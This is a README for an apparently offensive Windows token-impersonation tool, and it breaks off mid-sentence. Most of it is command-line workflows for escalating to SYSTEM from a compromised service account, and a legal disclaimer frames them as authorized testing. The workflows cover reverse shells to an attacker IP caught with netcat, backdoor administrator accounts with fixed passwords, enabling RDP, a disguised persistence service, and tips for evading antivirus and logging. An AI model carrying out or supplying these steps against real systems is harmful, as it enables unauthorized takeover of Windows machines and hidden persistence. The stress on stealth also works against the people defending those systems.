# Token Impersonation Tool v3.0

## Note - Spawning a shell from impersonated process is not working correctly. I am having trouble with it. If you would like please contribute and help. Thanks.

![Platform](https://img.shields.io/badge/Platform-Windows-blue)
![Language](https://img.shields.io/badge/Language-C%2B%2B-orange)
![License](https://img.shields.io/badge/License-Educational-red)
![Version](https://img.shields.io/badge/Version-3.0-green)

> Advanced Windows Token Manipulation for Authorized Penetration Testing

A robust C++ tool designed for security professionals to demonstrate and test Windows token impersonation vulnerabilities during authorized penetration tests and red team engagements.

## ⚠️ LEGAL DISCLAIMER

**THIS TOOL IS FOR AUTHORIZED SECURITY TESTING ONLY**

- ✅ Only use on systems you own or have explicit written permission to test
- ❌ Unauthorized access to computer systems is illegal under the Computer Fraud and Abuse Act (CFAA) and similar laws worldwide
- 📚 This tool is provided for educational purposes and authorized security assessments
- ⚖️ The authors assume no liability for misuse or damage caused by this program
- 📝 Always obtain proper authorization before testing

## 🎯 Purpose

This tool demonstrates Windows token impersonation techniques that leverage the `SeImpersonatePrivilege` (commonly held by service accounts) to escalate privileges and move laterally within Windows environments.

**Use Cases:**
- 🔴 Red Team Operations: Privilege escalation and lateral movement
- 🔍 Security Assessments: Testing token security controls
- 🎓 Educational Training: Understanding Windows access tokens
- 🛡️ Defensive Research: Improving detection capabilities

## ✨ Features

### Core Capabilities
- **Process Enumeration**: List all accessible processes with owner, elevation status, and integrity level
- **Token Impersonation**: Steal and impersonate tokens from other processes
- **Smart Process Selection**: Automatically identifies low-profile SYSTEM processes to avoid AV detection
- **Brute Force Mode**: Attempts impersonation across all processes for a target user until successful
- **Session Management**: Handles token session IDs for proper process creation

### Post-Exploitation Operations
- **Reverse Shell**: Base64-encoded PowerShell reverse shell with multiple fallback methods
- **User Creation**: Create new administrator accounts
- **RDP Enablement**: Enable Remote Desktop and configure firewall rules
- **Flexible Execution**: Execute arbitrary commands with impersonated tokens

### Evasion Features
- **Base64 Encoding**: PowerShell payloads are UTF-16LE base64-encoded to evade signature detection
- **Low-Profile Targeting**: Prioritizes less-monitored processes (`spoolsv.exe`, `SearchIndexer.exe`)
- **Multiple Execution Methods**: Fallback mechanisms for process creation
- **Hidden Execution**: Processes spawn without visible windows

## 🔧 Requirements

### Target System
- Windows Server 2016/2019/2022 or Windows 10/11
- Account with `SeImpersonatePrivilege` (IIS service accounts, SQL Server, local admin, etc.)
- Network connectivity for reverse shell operations

### Build Environment
- MinGW-w64 cross-compiler (Linux) or Visual Studio (Windows)
- Windows SDK headers

## 📦 Installation

### Compile on Linux (Kali/Parrot)
```bash
# Install MinGW compiler if not already installed
sudo apt update
sudo apt install mingw-w64

# Clone repository
git clone https://github.com/yourusername/token-impersonation-tool.git
cd token-impersonation-tool

# Compile
x86_64-w64-mingw32-g++ -mconsole -o TokenImpersonate.exe \
    main.cpp tokenImpersonate.cpp \
    -ladvapi32 -static-libgcc -static-libstdc++ -lws2_32

# Transfer to target
upload TokenImpersonate.exe
```

### Compile on Windows
```cmd
# Using Visual Studio Developer Command Prompt
cl /EHsc main.cpp tokenImpersonate.cpp advapi32.lib ws2_32.lib /Fe:TokenImpersonate.exe
```

## 📖 Usage

### Basic Syntax
```
TokenImpersonate.exe [command] [options]
```

### Command Reference

#### Enumeration
```powershell
# List all accessible processes
.\TokenImpersonate.exe list

# Filter for specific users
.\TokenImpersonate.exe list | findstr "SYSTEM"
.\TokenImpersonate.exe list | findstr "Administrators"
```

#### Impersonation
```powershell
# Auto-impersonate best SYSTEM process
.\TokenImpersonate.exe auto

# Impersonate specific PID
.\TokenImpersonate.exe 
.\TokenImpersonate.exe 540

# Brute force by username
.\TokenImpersonate.exe brute 
.\TokenImpersonate.exe brute "BUILTIN\Administrators"
.\TokenImpersonate.exe brute "NT AUTHORITY\SYSTEM"
```

#### Post-Exploitation
```powershell
# Spawn reverse shell
.\TokenImpersonate.exe  shell  
.\TokenImpersonate.exe 540 shell 192.168.19.128 4444

# Create admin user
.\TokenImpersonate.exe  adduser  
.\TokenImpersonate.exe 540 adduser hacker Pass123!

# Enable RDP
.\TokenImpersonate.exe  rdp
.\TokenImpersonate.exe 540 rdp

# Brute force with operations
.\TokenImpersonate.exe brute Administrator shell 192.168.19.128 4444
.\TokenImpersonate.exe brute Administrator adduser backdoor P@ssw0rd!
```

## 🎯 Common Workflows

<details>
<summary><b>Workflow 1: Basic Privilege Escalation (IIS/Web Server)</b></summary>

**Scenario:** You have a web shell with low privileges but `SeImpersonatePrivilege`
```powershell
# Step 1: Upload the tool
upload TokenImpersonate.exe

# Step 2: Verify privileges
.\TokenImpersonate.exe list

# Step 3: Auto-escalate to SYSTEM
.\TokenImpersonate.exe auto

# Result: New SYSTEM cmd.exe window spawns
```
</details>

<details>
<summary><b>Workflow 2: Get SYSTEM Shell via Service Account</b></summary>

**Scenario:** You compromised a service account (IIS, SQL, etc.)
```powershell
# Step 1: Check what you have
whoami /priv
# Look for: SeImpersonatePrivilege = Enabled

# Step 2: List accessible processes
.\TokenImpersonate.exe list | findstr "SYSTEM"

# Step 3: Target a SYSTEM process
.\TokenImpersonate.exe 540 shell 192.168.19.128 4444

# Step 4: On Kali - catch the shell
nc -lvnp 4444
```
</details>

<details>
<summary><b>Workflow 3: Create Backdoor Admin Account</b></summary>

**Scenario:** You want persistence via a new admin user
```powershell
# Step 1: Find a SYSTEM or Admin process
.\TokenImpersonate.exe list | findstr "spoolsv|SYSTEM"

# Step 2: Create admin user
.\TokenImpersonate.exe 540 adduser backdoor P@ssw0rd123!

# Step 3: Enable RDP for persistence
.\TokenImpersonate.exe 540 rdp

# Step 4: Verify user creation
net user backdoor
net localgroup Administrators

# Step 5: Connect via RDP
xfreerdp /v:192.168.19.135 /u:backdoor /p:'P@ssw0rd123!'
# OR via WinRM
evil-winrm -i 192.168.19.135 -u backdoor -p 'P@ssw0rd123!'
```
</details>

<details>
<summary><b>Workflow 4: Brute Force When You Don't Know PIDs</b></summary>

**Scenario:** You're not sure which process to target
```powershell
# Step 1: Brute force by username - tries all until one works
.\TokenImpersonate.exe brute "BUILTIN\Administrators"
# Result: Spawns SYSTEM cmd.exe from first working process

# Step 2: Use that to create backdoor
.\TokenImpersonate.exe brute Administrator adduser hacker Pass123!

# Step 3: Or get direct shell
.\TokenImpersonate.exe brute Administrator shell 192.168.19.128 4444
```
</details>

## 🔥 Pro Tips

### Process Selection Strategy
```powershell
# ❌ DON'T target these (too protected):
# - smss.exe, csrss.exe, wininit.exe, lsass.exe, services.exe

# ✅ DO target these (accessible SYSTEM processes):
.\TokenImpersonate.exe list | findstr "spoolsv|SearchIndexer|dllhost|msdtc|svchost"

# Best targets in order:
# 1. spoolsv.exe (Print Spooler) - rarely monitored
# 2. SearchIndexer.exe - low priority service  
# 3. dllhost.exe - generic COM host
# 4. msdtc.exe - rarely used
# 5. svchost.exe - pick one with SYSTEM privileges
```

### Use Your Own Process for Stealth
```powershell
# Instead of targeting random processes, use your current shell
$pid
.\TokenImpersonate.exe 6312 adduser hacker Pass123!
# Why? No failed access attempts logged, cleaner operation
```

### Brute Force is Your Friend
```powershell
# Don't guess PIDs - let brute force find what works
.\TokenImpersonate.exe brute Administrator shell 192.168.19.128 4444
# It will try all matching processes until one succeeds
```

### Persistence Techniques
```powershell
# Method 1: Hidden admin account
.\TokenImpersonate.exe 540 adduser sysupdate P@ssw0rd123!
net user sysupdate /active:yes

# Method 2: Enable RDP for remote access
.\TokenImpersonate.exe 540 rdp

# Method 3: Service creation
sc create "WindowsUpdateService" binPath= "C:\Windows\Tasks\backdoor.exe" start= auto
```

## 🚨 Troubleshooting

| Issue | Solution |
|-------|----------|
| "Failed to open process token" | Process is protected - try different PID or brute force |
| Shell spawns but closes immediately | Network blocked (firewall/AV) - create user and use WinRM instead |
| No SeImpersonatePrivilege | Wrong user context - need service account or use different exploit |
| Process says SUCCESS but nothing happens | Process spawned in Session 0 - use your current PID instead |

## 📊 Decision Tree
```
Do you have SeImpersonatePrivilege?
├─ YES → Continue
└─ NO → Stop, this tool won't work

What's your goal?
├─ Quick SYSTEM shell
│ └─ .\TokenImpersonate.exe auto
├─ Reverse shell  
│ └─ .\TokenImpersonate.exe brute Administrator shell <IP> <PORT>
├─ Persistence
│ ├─ .\TokenImpersonate.exe 540 adduser hacker Pass123!
│ └─ .\TokenImpersonate.exe 540 rdp
└─ Enumeration
  └─ .\TokenImpersonate.exe list
```

## ⚡ One-Liner Wins
```powershell
# Instant SYSTEM shell
.\TokenImpersonate.exe auto

# Instant admin user  
.\TokenImpersonate.exe brute Administrator adduser hacker Pass123!

# Instant RDP access
.\TokenImpersonate.exe 540 adduser hacker Pass123! ; .\TokenImpersonate.exe 540 rdp

# Use current process (cleanest)
.\TokenImpersonate.exe $pid adduser hacker Pass123!
```

## 🤝 Contributing

1. Fork the repository
2. Create a feature branch (`git checkout -b feature/improvement`)
3. Commit your changes (`git commit -am 'Add new feature'`)
4. Push to the branch (`git push origin feature/improvement`)
5. Create a Pull Request

## 📜 License

This project is licensed under the Educational Use License - see the [LICENSE](LICENSE) file for details.

## 🔗 References

- [Windows Access Tokens](https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens)
- [SeImpersonatePrivilege](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/impersonate-a-client-after-authentication)
- [Token Impersonation Techniques](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-abusing-tokens)

## ⭐ Star History

[![Star History Chart](https://api.star-history.com/svg?repos=yourusername/token-impersonation-tool&type=Date)](https://star-history.com/#yourusername/token-impersonation-tool&Date)

---

**Remember: This tool is only as stealthy as your usage. Use responsibly and only on a
